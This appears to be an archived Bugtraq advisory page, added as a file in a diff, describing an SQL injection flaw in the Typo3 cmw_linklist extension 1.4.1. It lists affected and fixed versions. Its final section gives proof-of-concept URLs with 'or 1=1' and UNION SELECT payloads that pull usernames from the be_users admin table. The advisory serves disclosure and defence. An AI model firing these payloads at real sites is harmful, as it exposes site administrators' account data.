@@ -1,0 +1,109 @@
+#SpeeDr00t@Black Falcon<br>#bid12721<p><b><span style="font-size: 18pt;">Typo3 CMW_Linklist Extension SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12721/info">info</a><br><a href="http://www.securityfocus.com/bid/12721/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12721/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12721/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12721/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12721
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Mar 03 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 03 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to Fabian Becker &lt;neonomicus@gmx.de&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Sebastian Faulhaber cmw_linklist 1.4.1 <br/>
+<span class="related">
+						
+							+ 
+						
+						Typo3 Typo3 3.7 .0<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Typo3 Typo3 3.6.2 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Sebastian Faulhaber cmw_linklist 1.5 .0<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept is available:<br/>http://www.example.com/LinksSection?&amp;no_cache=1&amp;action=getviewcategory&amp;category_uid=1%20or%201=1<br/><br/>Gulftech Security Research has supplied the following additional proof of concepts:<br/>A test for vulnerability:<br/>http://www.example.com/path/?&amp;action=getviewcategory&amp;category_uid=-99%20UNION%20SELECT%20username%20FROM%20be_users%20WHERE%20uid=1/*<br/>Lists user names and categories:<br/>http://www.example.com/path/?&amp;action=getviewcategory&amp;category_uid=-99%20UNION%20SELECT%20username,null%20FROM%20be_users%20WHERE%201/*
+	
+		<ul>
+</ul>
+</div>
